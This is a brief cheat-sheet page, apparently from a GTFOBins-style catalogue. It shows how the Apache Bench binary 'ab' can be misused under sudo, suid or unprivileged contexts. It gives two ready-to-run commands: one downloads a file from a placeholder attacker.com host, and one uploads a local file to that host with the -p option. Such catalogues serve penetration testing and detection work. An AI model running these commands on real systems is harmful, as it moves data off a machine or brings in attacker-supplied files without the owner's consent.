title: ab
html:
ab

Download

Context: sudo, suid, unprivileged

ab -v2 http://attacker.com/path/to/input-file

Upload

Context: sudo, suid, unprivileged

ab -p /path/to/input-file http://attacker.com/
excerpt: ab Download Context: sudo, suid, unprivileged ab -v2 http://attacker.com/path/to/input-file Upload Context: sudo, suid, unprivileged ab -p /path/to/input-file http://attacker.com/
